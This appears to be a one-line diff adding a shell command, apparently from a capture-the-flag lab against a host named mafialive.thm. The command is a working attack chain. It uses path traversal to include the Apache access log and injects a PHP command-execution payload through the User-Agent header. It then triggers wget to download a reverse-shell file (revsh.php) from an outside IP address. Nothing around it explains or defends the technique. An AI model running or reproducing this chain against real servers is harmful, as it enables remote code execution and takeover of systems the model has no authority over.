@@ -1,0 +1,1 @@
+curl -s http://mafialive.thm/test.php\?view\=/var/www/html/development_testing/.././.././../log/apache2/access.log\&cmd\=wget%20http%3A%2F%2F10.8.15.121%3A5120%2Frevsh.php -A "<?php system(\$_GET['cmd']); ?>"
